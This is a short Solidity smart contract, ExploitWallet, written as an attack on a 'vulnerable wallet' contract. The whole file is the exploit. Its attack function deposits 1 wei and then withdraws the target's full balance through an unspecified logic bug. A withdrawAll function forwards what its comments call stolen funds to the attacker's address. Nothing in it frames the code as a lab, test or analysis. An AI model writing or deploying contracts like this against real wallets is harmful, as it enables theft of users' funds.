pragma solidity ^0.4.24;

interface IVulnerableWallet {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ExploitWallet {
    IVulnerableWallet public vulnerable;
    address public owner;

    constructor(address _vulnerable) public {
        vulnerable = IVulnerableWallet(_vulnerable);
        owner = msg.sender;
    }

    // Step 1: Deposit tiny ETH to initialize balance mapping
    function attack() public payable {
        require(msg.sender == owner);

        // Deposit tiny amount (e.g., 1 wei)
        vulnerable.deposit.value(1 wei)();

        // Step 2: Exploit the logic bug to withdraw much more
        vulnerable.withdraw(address(vulnerable).balance);
    }

    // Fallback to receive ETH
    function() external payable {}

    // Withdraw stolen funds to attacker
    function withdrawAll() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

